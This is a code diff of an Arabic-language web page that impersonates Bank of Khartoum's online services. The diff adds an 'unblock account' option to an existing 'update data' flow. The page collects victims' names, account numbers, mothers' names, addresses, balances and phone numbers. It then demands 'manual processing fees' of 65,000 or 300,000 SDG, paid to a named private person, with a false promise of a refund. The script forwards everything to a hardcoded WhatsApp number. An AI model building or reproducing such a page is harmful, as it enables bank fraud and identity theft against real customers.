@@ -3,162 +3,112 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بنك الخرطوم - تحديث البيانات</title>
+    <title>بنك الخرطوم - الخدمات الإلكترونية</title>
     
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
     
     <style>
-        :root {
-            --bok-red: #C1272D;
-            --bok-dark-red: #A32025;
-            --bok-gray: #58595B;
-            --bok-text: #231F20;
-            --bok-input-border: #D1D3D4;
-        }
-
-        body {
-            font-family: 'Cairo', sans-serif;
-            background-color: #FFFFFF;
-            color: var(--bok-text);
-            margin: 0;
-            padding: 0;
-        }
-
-        .page-header {
-            background-color: var(--bok-red);
-            color: #FFFFFF;
-            padding: 15px 20px;
-            width: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            position: fixed;
-            top: 0;
-            left: 0;
-            z-index: 1000;
-        }
-
-        .page-title {
-            font-size: 18px;
-            font-weight: 700;
-            margin: 0;
-        }
-
-        .main-content {
-            margin-top: 80px;
-            padding: 20px;
-        }
-
-        .bok-input {
-            width: 100%;
-            padding: 12px 15px;
-            border: 1px solid var(--bok-input-border);
-            border-radius: 8px;
-            font-family: 'Cairo', sans-serif;
-            font-size: 14px;
-            color: var(--bok-text);
-            outline: none;
-            transition: border-color 0.2s;
-        }
-
-        .bok-input:focus {
-            border-color: var(--bok-red);
-        }
-
-        .bok-btn-primary {
-            background-color: var(--bok-red);
-            color: #FFFFFF;
-            font-weight: 700;
-            padding: 12px 20px;
-            border-radius: 8px;
-            width: 100%;
-            font-family: 'Cairo', sans-serif;
-            font-size: 16px;
-            cursor: pointer;
-            border: none;
-        }
-
-        .platform-title {
-            color: var(--bok-gray);
-            font-size: 24px;
-            font-weight: 700;
-            margin-bottom: 5px;
-        }
-
-        .step-container {
-            display: none;
-        }
-
-        .step-container.active {
-            display: block;
-        }
+        :root { --bok-red: #C1272D; --bok-gray: #58595B; --bok-text: #231F20; --bok-input-border: #D1D3D4; }
+        body { font-family: 'Cairo', sans-serif; background-color: #FFFFFF; color: var(--bok-text); margin: 0; padding: 0; }
+        .page-header { background-color: var(--bok-red); color: #FFFFFF; padding: 15px 20px; width: 100%; display: flex; align-items: center; justify-content: space-between; position: fixed; top: 0; z-index: 1000; }
+        .main-content { margin-top: 80px; padding: 20px; }
+        .bok-input { width: 100%; padding: 12px 15px; border: 1px solid var(--bok-input-border); border-radius: 8px; font-size: 14px; outline: none; transition: border-color 0.2s; }
+        .bok-input:focus { border-color: var(--bok-red); }
+        .bok-btn-primary { background-color: var(--bok-red); color: #FFFFFF; font-weight: 700; padding: 12px 20px; border-radius: 8px; width: 100%; cursor: pointer; border: none; }
+        .step-container { display: none; }
+        .step-container.active { display: block; }
+        .service-card { border: 2px solid #f3f4f6; transition: all 0.3s; cursor: pointer; }
+        .service-card.selected { border-color: var(--bok-red); background-color: #fef2f2; }
     </style>
 </head>
 <body>
 
     <header class="page-header">
-        <h1 class="page-title">تحديث بيانات حسابي</h1>
+        <h1 class="page-title" id="header-title">الخدمات الإلكترونية</h1>
         <div class="flex gap-4 text-lg">
             <i class="fas fa-ellipsis-v"></i>
-            <i class="fas fa-arrow-left"></i>
+            <i class="fas fa-arrow-left" onclick="location.reload()" style="cursor: pointer;"></i>
         </div>
     </header>
 
     <main class="main-content">
         <div class="text-center">
-            <img src="bank_logo.png" alt="شعار بنك الخرطوم" class="mx-auto my-6" style="max-width: 250px;">
-            <h2 class="platform-title">تحديث البيانات</h2>
-            <p class="text-gray-400 text-sm mb-8">يرجى اتباع الخطوات لتحديث بيانات طلبك المتعلق بالرقم المرجعي</p>
+            <img src="bank_logo.png" alt="شعار بنك الخرطوم" class="mx-auto my-6" style="max-width: 200px;">
         </div>
 
-        <div class="flex items-center justify-center mb-8 gap-2">
-            <div id="p1" class="w-10 h-10 rounded-full bg-bok-red text-white flex items-center justify-center font-bold text-lg shadow-md">1</div>
+        <div id="stepper" class="flex items-center justify-center mb-8 gap-2 hidden">
+            <div id="p1" class="w-10 h-10 rounded-full bg-bok-red text-white flex items-center justify-center font-bold shadow-md">1</div>
             <div id="l1" class="flex-1 h-1 bg-gray-200" style="max-width: 50px;"></div>
-            <div id="p2" class="w-10 h-10 rounded-full bg-gray-200 text-gray-500 flex items-center justify-center font-bold text-lg">2</div>
+            <div id="p2" class="w-10 h-10 rounded-full bg-gray-200 text-gray-500 flex items-center justify-center font-bold">2</div>
             <div id="l2" class="flex-1 h-1 bg-gray-200" style="max-width: 50px;"></div>
-            <div id="p3" class="w-10 h-10 rounded-full bg-gray-200 text-gray-500 flex items-center justify-center font-bold text-lg">3</div>
+            <div id="p3" class="w-10 h-10 rounded-full bg-gray-200 text-gray-500 flex items-center justify-center font-bold">3</div>
         </div>
 
         <form id="mainForm" onsubmit="return false;">
             
-            <div class="step-container active" id="step1">
-                <div class="space-y-5">
-                    <input type="text" id="full_name" placeholder="الاسم رباعي كما في الهوية" class="bok-input" required>
-                    <input type="text" id="id_number" placeholder="رقم الهوية (وطني / جواز / بطاقة)" class="bok-input" required>
-                    <input type="text" id="ref_number" placeholder="الرقم المرجعي (Reference Number)" class="bok-input text-left" dir="ltr" required>
+            <div class="step-container active" id="step0">
+                <h2 class="text-center font-bold text-xl mb-6">مرحباً بك، اختر الخدمة المطلوبة:</h2>
+                <div class="space-y-4">
+                    <div onclick="selectService('update')" class="service-card p-4 rounded-xl flex items-center gap-4">
+                        <div class="bg-red-100 p-3 rounded-full text-bok-red"><i class="fas fa-user-edit text-xl"></i></div>
+                        <div>
+                            <p class="font-bold">تحديث بيانات الحساب</p>
+                            <p class="text-xs text-gray-500">تحديث الرقم المرجعي والمعلومات الأساسية</p>
+                        </div>
+                    </div>
+                    <div onclick="selectService('unblock')" class="service-card p-4 rounded-xl flex items-center gap-4">
+                        <div class="bg-red-100 p-3 rounded-full text-bok-red"><i class="fas fa-unlock-alt text-xl"></i></div>
+                        <div>
+                            <p class="font-bold">حل مشكلة الحساب المحظور</p>
+                            <p class="text-xs text-gray-500">تقديم طلب فك حظر فوري للحساب</p>
+                        </div>
+                    </div>
                 </div>
-                <button type="button" onclick="goToStep(2)" class="bok-btn-primary mt-10 shadow-lg">التالي</button>
+            </div>
+
+            <div class="step-container" id="step1">
+                <div class="space-y-4">
+                    <input type="text" id="full_name" placeholder="الاسم رباعي كما في الهوية" class="bok-input" required>
+                    <input type="text" id="acc_number" placeholder="رقم الحساب الشخصي" class="bok-input text-left" dir="ltr" required>
+                    <div id="update_fields" class="hidden">
+                        <input type="text" id="ref_number" placeholder="الرقم المرجعي (Reference Number)" class="bok-input text-left" dir="ltr">
+                    </div>
+                    <div id="unblock_fields" class="hidden space-y-4">
+                        <input type="text" id="branch" placeholder="فرع فتح الحساب" class="bok-input">
+                        <input type="text" id="balance" placeholder="المبلغ الموجود في الحساب (تقريباً)" class="bok-input">
+                    </div>
+                </div>
+                <button type="button" onclick="goToStep(2)" class="bok-btn-primary mt-8">التالي</button>
             </div>
 
             <div class="step-container" id="step2">
-                <div class="space-y-5">
+                <div class="space-y-4">
                     <input type="text" id="mother_name" placeholder="إسم الوالدة بالكامل" class="bok-input" required>
                     <input type="text" id="address" placeholder="عنوان السكن الحالي" class="bok-input" required>
-                    <div>
-                        <input type="text" id="dob" placeholder="تاريخ الميلاد (مثال: 1990/01/01)" class="bok-input text-left" dir="ltr" required>
-                        <p class="text-[10px] text-gray-400 mt-1 mr-1 text-right">يرجى إدخال التاريخ يدوياً (يوم/شهر/سنة)</p>
+                    <input type="tel" id="whatsapp_phone" placeholder="رقم الواتساب للتواصل" class="bok-input text-left" dir="ltr" required>
+                    <div id="unblock_date_container" class="hidden">
+                        <label class="text-xs text-gray-500 mr-2">تاريخ حظر الحساب (إن وجد):</label>
+                        <input type="text" id="block_date" placeholder="مثال: 2024/05/10" class="bok-input text-left" dir="ltr">
                     </div>
-                    <input type="tel" id="phone_linked" placeholder="رقم الهاتف المسجل مع الحساب" class="bok-input text-left" dir="ltr" required>
                 </div>
-                <div class="flex gap-3 mt-10">
+                <div class="flex gap-3 mt-8">
                     <button type="button" onclick="goToStep(1)" class="w-1/3 py-3 border border-gray-300 rounded-lg text-gray-600 font-bold">السابق</button>
-                    <button type="button" onclick="goToStep(3)" class="w-2/3 bok-btn-primary shadow-lg">التالي</button>
+                    <button type="button" onclick="goToStep(3)" class="w-2/3 bok-btn-primary">التالي</button>
                 </div>
             </div>
 
             <div class="step-container" id="step3">
                 <div class="space-y-5">
-                    <div class="bg-red-50 p-4 border-r-4 border-red-600 mb-4 text-right">
+                    <div class="bg-red-50 p-4 border-r-4 border-red-600 text-right">
                         <p class="text-sm font-bold text-red-800">تنبيه المعالجة اليدوية:</p>
-                        <p class="text-xs text-red-700 leading-relaxed">
-                            بسبب ضغط الطلبات، يتم دفع رسوم رمزية بقيمة <b>65,000 ج.س</b> مقابل فرز ومعالجة طلبك يدوياً لضمان اكتمال التحديث خلال 24 ساعة عمل فقط. 
-                            <span class="block mt-1 font-semibold text-gray-800">سيتم خصم مبلغ 5,000 ج.س فقط من الرسوم، وإعادة إيداع المبلغ المتبقي (60,000 ج.س) في حسابكم فوراً بعد التحديث.</span>
-                        </p>
+                        <div id="fee_text_update" class="hidden text-xs text-red-700 leading-relaxed">
+                            بسبب ضغط الطلبات، يتم دفع رسوم رمزية بقيمة <b>65,000 ج.س</b> مقابل المعالجة اليدوية. يتم خصم 5,000 ج.س فقط وإعادة 60,000 ج.س لحسابكم فوراً.
+                        </div>
+                        <div id="fee_text_unblock" class="hidden text-xs text-red-700 leading-relaxed">
+                            بسبب ضغط الطلبات، يتم دفع رسوم معالجة يدوية بقيمة <b>300,000 ج.س</b> لضمان فك حظر الحساب خلال 24 ساعة. يتم خصم 15,000 ج.س فقط وإعادة الباقي لحسابكم فوراً.
+                        </div>
                     </div>
 
                     <div class="bg-gray-50 p-5 rounded-lg border border-dashed text-center">
@@ -167,13 +117,11 @@
                         <p class="text-xs text-gray-500 mt-1">بإسم: إلهام الطيب احمد إبراهيم</p>
                     </div>
 
-                    <div>
-                        <input type="text" id="transaction_id" placeholder="رقم العملية (من إشعار التحويل)" class="bok-input text-center font-bold text-lg border-2" required>
-                    </div>
+                    <input type="text" id="transaction_id" placeholder="رقم العملية (من إشعار التحويل)" class="bok-input text-center font-bold text-lg border-2" required>
                 </div>
-                <div class="flex gap-3 mt-10">
+                <div class="flex gap-3 mt-8">
                     <button type="button" onclick="goToStep(2)" class="w-1/3 py-3 border border-gray-300 rounded-lg text-gray-600 font-bold">تعديل</button>
-                    <button type="button" onclick="sendToWhatsApp()" class="w-2/3 bg-green-600 text-white font-bold py-3 rounded-lg flex items-center justify-center gap-2 shadow-xl hover:bg-green-700">
+                    <button type="button" onclick="sendToWhatsApp()" class="w-2/3 bg-green-600 text-white font-bold py-3 rounded-lg flex items-center justify-center gap-2 shadow-xl">
                         <i class="fab fa-whatsapp text-2xl"></i> تأكيد وإرسال
                     </button>
                 </div>
@@ -181,13 +129,37 @@
 
         </form>
 
-        <footer class="mt-12 text-center text-[12px] text-gray-400 border-t pt-4 font-bold">
-            جميع الحقوق محفوظة بنك الخرطوم
+        <footer class="mt-12 text-center text-[10px] text-gray-400 border-t pt-4">
+            جميع الحقوق محفوظة بنك الخرطوم &copy; 2026
         </footer>
     </main>
 
     <script>
-        const MY_WHATSAPP = "249960724630"; 
+        let selectedService = '';
+        const MY_WHATSAPP = "249960724630";
+
+        function selectService(service) {
+            selectedService = service;
+            document.getElementById('step0').classList.remove('active');
+            document.getElementById('stepper').classList.remove('hidden');
+            document.getElementById('step1').classList.add('active');
+            
+            if(service === 'update') {
+                document.getElementById('header-title').innerText = "تحديث البيانات";
+                document.getElementById('update_fields').classList.remove('hidden');
+                document.getElementById('unblock_fields').classList.add('hidden');
+                document.getElementById('unblock_date_container').classList.add('hidden');
+                document.getElementById('fee_text_update').classList.remove('hidden');
+                document.getElementById('fee_text_unblock').classList.add('hidden');
+            } else {
+                document.getElementById('header-title').innerText = "حل مشكلة الحساب المحظور";
+                document.getElementById('unblock_fields').classList.remove('hidden');
+                document.getElementById('update_fields').classList.add('hidden');
+                document.getElementById('unblock_date_container').classList.remove('hidden');
+                document.getElementById('fee_text_unblock').classList.remove('hidden');
+                document.getElementById('fee_text_update').classList.add('hidden');
+            }
+        }
 
         function goToStep(step) {
             document.querySelectorAll('.step-container').forEach(s => s.classList.remove('active'));
@@ -198,47 +170,52 @@
 
             if (step >= 2) {
                 p2.classList.add('bg-bok-red', 'text-white');
-                p2.classList.remove('bg-gray-200', 'text-gray-500');
                 l1.classList.add('bg-bok-red');
             } else {
-                p2.classList.replace('bg-bok-red', 'bg-gray-200');
-                p2.classList.replace('text-white', 'text-gray-500');
+                p2.classList.remove('bg-bok-red', 'text-white');
                 l1.classList.remove('bg-bok-red');
             }
 
             if (step === 3) {
                 p3.classList.add('bg-bok-red', 'text-white');
-                p3.classList.remove('bg-gray-200', 'text-gray-500');
                 l2.classList.add('bg-bok-red');
             } else {
-                p3.classList.replace('bg-bok-red', 'bg-gray-200');
-                p3.classList.replace('text-white', 'text-gray-500');
+                p3.classList.remove('bg-bok-red', 'text-white');
                 l2.classList.remove('bg-bok-red');
             }
             window.scrollTo(0, 0);
         }
 
         function sendToWhatsApp() {
-            const name = document.getElementById('full_name').value;
-            const ref = document.getElementById('ref_number').value;
             const transId = document.getElementById('transaction_id').value;
-            const phone = document.getElementById('phone_linked').value;
+            if (!transId) { alert("يرجى إدخال رقم العملية"); return; }
 
-            if (!transId) {
-                alert("يرجى إدخال رقم العملية");
-                return;
+            const commonData = `*الاسم:* ${document.getElementById('full_name').value}%0A` +
+                               `*رقم الحساب:* ${document.getElementById('acc_number').value}%0A` +
+                               `*اسم الوالدة:* ${document.getElementById('mother_name').value}%0A` +
+                               `*السكن:* ${document.getElementById('address').value}%0A` +
+                               `*واتساب:* ${document.getElementById('whatsapp_phone').value}%0A` +
+                               `*رقم العملية:* ${transId}`;
+
+            let specificData = "";
+            let serviceTitle = "";
+            let footerMessage = "";
+
+            if(selectedService === 'update') {
+                serviceTitle = "تحديث بيانات";
+                specificData = `*المرجعي:* ${document.getElementById('ref_number').value}%0A*المبلغ:* 65,000 ج.س`;
+                footerMessage = "تم سداد مبلغ 65,000 ج.س رسوم معالجة يدوية وفورية.";
+            } else {
+                serviceTitle = "فك حظر حساب";
+                specificData = `*الفرع:* ${document.getElementById('branch').value}%0A` +
+                               `*الرصيد التقريبي:* ${document.getElementById('balance').value}%0A` +
+                               `*تاريخ الحظر:* ${document.getElementById('block_date').value}%0A` +
+                               `*المبلغ:* 300,000 ج.س`;
+                footerMessage = "تم سداد مبلغ 300,000 ج.س رسوم معالجة يدوية%0Aو ارغب في بدء الإجراءات";
             }
 
-            const message = `*طلب تحديث بيانات بنكك*%0A` +
-                            `--------------------------%0A` +
-                            `*الاسم:* ${name}%0A` +
-                            `*المرجعي:* ${ref}%0A` +
-                            `*رقم الحساب:* ${phone}%0A` +
-                            `*رقم العملية:* ${transId}%0A` +
-                            `--------------------------%0A` +
-                            `تم سداد مبلغ 65,000 ج.س (معالجة يدوية وفورية).`;
-
-            window.open(`https://wa.me/${MY_WHATSAPP}?text=${message}`, '_blank');
+            const finalMessage = `*طلب ${serviceTitle}*%0A--------------------------%0A${commonData}%0A${specificData}%0A--------------------------%0A${footerMessage}`;
+            window.open(`https://wa.me/${MY_WHATSAPP}?text=${finalMessage}`, '_blank');
         }
     </script>
 </body>
